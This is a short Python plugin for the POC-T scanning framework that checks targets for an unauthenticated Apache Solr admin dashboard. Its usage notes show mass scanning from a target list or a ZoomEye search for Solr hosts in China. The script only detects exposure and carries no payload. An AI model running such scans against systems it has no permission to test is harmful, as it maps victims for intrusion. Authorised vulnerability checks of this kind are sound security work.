#!/usr/bin/env python
# -*- coding: utf-8 -*-
# project = https://github.com/Xyntax/POC-T
# author = i@cdxy.me

"""
Apache Solr 未授权访问PoC
  (iterate_path函数使用场景示例)

Usage
  python POC-T.py -s solr-unauth -iF target.txt
  python POC-T.py -s solr-unauth -aZ "solr country:cn"

"""

import requests
from plugin.useragent import firefox
from plugin.urlparser import iterate_path


def poc(target):
    base_url = target if "://" in target else 'http://' + target
    for each in iterate_path(base_url):
        try:
            url = each
            g = requests.get(url, headers={'User-Agent': firefox()})
            if g.status_code is 200 and 'Solr Admin' in g.content and 'Dashboard' in g.content:
                return url
            url = url + '/solr/'
            g = requests.get(url, headers={'User-Agent': firefox()})
            if g.status_code is 200 and 'Solr Admin' in g.content and 'Dashboard' in g.content:
                return url
        except Exception:
            pass
    return False
